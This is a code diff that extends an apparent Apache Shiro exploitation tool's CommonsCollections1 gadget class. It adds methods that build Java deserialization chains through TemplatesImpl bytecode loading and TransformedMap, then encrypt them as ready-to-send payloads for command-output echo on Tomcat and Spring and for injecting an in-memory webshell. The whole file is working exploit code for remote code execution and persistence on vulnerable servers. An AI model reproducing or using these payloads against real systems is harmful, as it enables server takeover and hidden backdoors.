@@ -1,5 +1,9 @@
 package com.y5neko.shiroexp.gadget;
 
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import com.y5neko.shiroexp.misc.Tools;
+import javassist.*;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
@@ -11,11 +15,26 @@ import java.io.IOException;
 import java.io.ObjectOutputStream;
 import java.lang.annotation.Target;
 import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
 import java.lang.reflect.InvocationTargetException;
+import java.util.Base64;
 import java.util.HashMap;
 import java.util.Map;
 
 public class CommonsCollections1 {
+
+    /**
+     * 反射设置字段值
+     */
+    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+
+    /**
+     * 生成命令执行payload（原有功能）
+     */
     public static byte[] genPayload(String cmd) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
         // 提取执行命令
         String[] cmd_array = cmd.split(" ");
@@ -44,5 +63,190 @@ public class CommonsCollections1 {
         oos.writeObject(object);
         oos.close();
         return baos.toByteArray();
+    }
+
+    /**
+     * 生成回显payload
+     * @param echoType 回显类型
+     * @return 加密后的payload字符串
+     */
+    public static String genEchoPayload(String echoType, String key) throws Exception {
+        ClassPool pool = ClassPool.getDefault();
+        CtClass ctClass;
+        CtClass superClass;
+
+        if (echoType.equals("TomcatEcho")) {
+            TomcatEcho tomcatEcho = new TomcatEcho();
+            ctClass = tomcatEcho.genPayload(pool);
+
+            if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
+                superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
+            } else {
+                superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
+            }
+            ctClass.setSuperclass(superClass);
+
+            TemplatesImpl templates = new TemplatesImpl();
+            setFieldValue(templates, "_bytecodes", new byte[][]{ctClass.toBytecode()});
+            setFieldValue(templates, "_name", "a");
+            setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
+
+            Transformer[] transformers = new Transformer[]{
+                    new ConstantTransformer(templates),
+                    new InvokerTransformer("newTransformer", new Class[0], new Object[0]),
+                    new ConstantTransformer(1)
+            };
+            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+            HashMap<Object, Object> innerMap = new HashMap<Object, Object>();
+            innerMap.put("value", "value");
+            Map<Object, Object> transformedMap = TransformedMap.decorate(innerMap, null, chainedTransformer);
+
+            Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+            Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
+            constructor.setAccessible(true);
+            Object object = constructor.newInstance(Target.class, transformedMap);
+
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            ObjectOutputStream oos = new ObjectOutputStream(baos);
+            oos.writeObject(object);
+            oos.close();
+
+            String data = Base64.getEncoder().encodeToString(baos.toByteArray());
+            return Tools.CBC_Encrypt(key, data);
+
+        } else if (echoType.equals("SpringEcho")) {
+            SpringEcho springEcho = new SpringEcho();
+            ctClass = springEcho.genPayload(pool);
+
+            if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
+                superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
+            } else {
+                superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
+            }
+            ctClass.setSuperclass(superClass);
+
+            TemplatesImpl templates = new TemplatesImpl();
+            setFieldValue(templates, "_bytecodes", new byte[][]{ctClass.toBytecode()});
+            setFieldValue(templates, "_name", "a");
+            setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
+
+            Transformer[] transformers = new Transformer[]{
+                    new ConstantTransformer(templates),
+                    new InvokerTransformer("newTransformer", new Class[0], new Object[0]),
+                    new ConstantTransformer(1)
+            };
+            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+            HashMap<Object, Object> innerMap = new HashMap<Object, Object>();
+            innerMap.put("value", "value");
+            Map<Object, Object> transformedMap = TransformedMap.decorate(innerMap, null, chainedTransformer);
+
+            Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+            Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
+            constructor.setAccessible(true);
+            Object object = constructor.newInstance(Target.class, transformedMap);
+
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            ObjectOutputStream oos = new ObjectOutputStream(baos);
+            oos.writeObject(object);
+            oos.close();
+
+            String data = Base64.getEncoder().encodeToString(baos.toByteArray());
+            return Tools.CBC_Encrypt(key, data);
+
+        } else if (echoType.equals("AllEcho")) {
+            AllEcho allEcho = new AllEcho();
+            ctClass = allEcho.genPayload(pool);
+
+            if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
+                superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
+            } else {
+                superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
+            }
+            ctClass.setSuperclass(superClass);
+
+            TemplatesImpl templates = new TemplatesImpl();
+            setFieldValue(templates, "_bytecodes", new byte[][]{ctClass.toBytecode()});
+            setFieldValue(templates, "_name", "a");
+            setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
+
+            Transformer[] transformers = new Transformer[]{
+                    new ConstantTransformer(templates),
+                    new InvokerTransformer("newTransformer", new Class[0], new Object[0]),
+                    new ConstantTransformer(1)
+            };
+            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+            HashMap<Object, Object> innerMap = new HashMap<Object, Object>();
+            innerMap.put("value", "value");
+            Map<Object, Object> transformedMap = TransformedMap.decorate(innerMap, null, chainedTransformer);
+
+            Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+            Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
+            constructor.setAccessible(true);
+            Object object = constructor.newInstance(Target.class, transformedMap);
+
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            ObjectOutputStream oos = new ObjectOutputStream(baos);
+            oos.writeObject(object);
+            oos.close();
+
+            String data = Base64.getEncoder().encodeToString(baos.toByteArray());
+            return Tools.CBC_Encrypt(key, data);
+
+        } else {
+            throw new Exception("不支持的回显类型: " + echoType);
+        }
+    }
+
+    /**
+     * 生成内存马payload
+     * @return 加密后的payload字符串
+     */
+    public static String genMemPayload(String key) throws Exception {
+        ClassPool pool = ClassPool.getDefault();
+        CtClass ctClass;
+        CtClass superClass;
+
+        // 使用 MemInject 作为内存马注入器
+        MemInject memInject = new MemInject();
+        ctClass = memInject.genPayload(pool);
+
+        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
+            superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
+        } else {
+            superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
+        }
+        ctClass.setSuperclass(superClass);
+
+        TemplatesImpl templates = new TemplatesImpl();
+        setFieldValue(templates, "_bytecodes", new byte[][]{ctClass.toBytecode()});
+        setFieldValue(templates, "_name", "a");
+        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
+
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(templates),
+                new InvokerTransformer("newTransformer", new Class[0], new Object[0]),
+                new ConstantTransformer(1)
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        HashMap<Object, Object> innerMap = new HashMap<Object, Object>();
+        innerMap.put("value", "value");
+        Map<Object, Object> transformedMap = TransformedMap.decorate(innerMap, null, chainedTransformer);
+
+        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
+        constructor.setAccessible(true);
+        Object object = constructor.newInstance(Target.class, transformedMap);
+
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(object);
+        oos.close();
+
+        String data = Base64.getEncoder().encodeToString(baos.toByteArray());
+        return Tools.CBC_Encrypt(key, data);
     }
 }
